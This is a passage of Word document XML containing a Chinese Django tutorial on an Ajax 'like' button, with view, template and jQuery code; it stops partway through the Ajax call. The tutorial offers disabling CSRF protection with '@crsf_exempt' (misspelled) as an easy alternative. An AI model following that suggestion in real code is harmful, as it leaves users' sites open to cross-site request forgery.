      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39B20530" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            article = Article.objects.get(id=article_id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC3A0A1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            if action == 'like':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="656A5FFD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                article.users_like.add(request.user)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12EE5A7D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D61A0AC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                article.users_like.remove(request.user)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33CE39B2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return JsonResponse({'status':'ok'})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E47DA0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        except:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D3D0E44" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1613B9C0" w14:textId="46B4480E" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return JsonResponse({'status':'fail'})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC9B13A" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上面这段代码是这么工作的:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DA0B393" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们使用@login_required和@require_http_methods两个装饰器用户必需要先登录才能点赞，而且只接收通过POST方式发送过来的请求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6915B60A" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果发送过来的Ajax POST请求包括article_id和action两个参数。我们根据action对数据库进行更新。如果操作成功，就给前端返回Json格式的数据{"status":"ok"}。我们在Article模型的多对多字段users_like上使用了 Django 提供的add()或者remove()方法来执行多对多关系的建立和删除, 这个方法并save方法更快捷。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F57AD9"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如果用户未登陆或某些操作未成功，我们给前端返回Json数据</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{"status":"fail"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="647688CF" w14:textId="7A58FD9F" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="326B4CF6" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模板与Ajax代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59743D8D" w14:textId="755DF7F5" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B6A2F4D" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>最后我们需要在article_detail模板加入下面2段代码，实现本文所需要的功能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13A57817" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># blog/template/article_detail.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFCB909" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>第一段为html代码，主要用来展示点赞按钮和总点赞数。我们设置了data-id和data-action两个参数，便于Ajax通过DOM获取文章id和action。我们先判断当前用户是否在已点赞用户清单里，如果在的话，action变为unlike。如果不在的话，action为like。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351F1F07" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% if article.status == "p" %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50DA980C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;p&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>发布于</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">{{ article.pub_date | date:"Y-m-j" }}   </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>浏览</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{{ article.views }}</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>次</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E110D1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% with total_likes=article.users_like.count  users_like=article.users_like.all %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4736BC2E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;a href="#" data-id="{{ article.id }}" </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78417E21" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">data-action="{% if request.user in users_like %}un{% endif %}like" </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626FBC1D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class="like button"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D15AEF8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  &lt;span class="glyphicon glyphicon-thumbs-up count"&gt;{{ total_likes }}&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B5327AD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E19D7A2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endwith %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02197B2B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73536E53" w14:textId="10720AEA" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62BC611C" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FE64BDB" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>第二段为JS代码， 如下所示。因为我们采用的是POST提交方式，Django默认POST是需要附上csrftoken的。本例中我们在Ajax请求发送前使用了jQuery的cookie库把crsftoken加入到请求头里(见beforeSend属性)。如果你不想要发送csrftoken，你还可以在视图里使用@crsf_exempt装饰器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DDBA10" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block js %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65A78813" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;script src=" https://cdn.jsdelivr.net/jquery.cookie/1.4.1/jquery.cookie.min.js "&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C549B88" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE70322" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CC0990F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C0C1572" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>var csrftoken = $.cookie('csrftoken');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A937A8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>function csrfSafeMethod(method) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348F8930" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D29D8DD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="007CD20A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42F3000B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>$(document).ready(function(){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C165D70" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">   $('a.like').click(function(e){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390A26B0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        e.preventDefault();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BBDF0C6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        var id = $(this).data('id');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E8077B9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        var action = $(this).data('action');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22EBED4F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05FFEC62" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        $.ajax({</w:t>
      </w:r>
    </w:p>
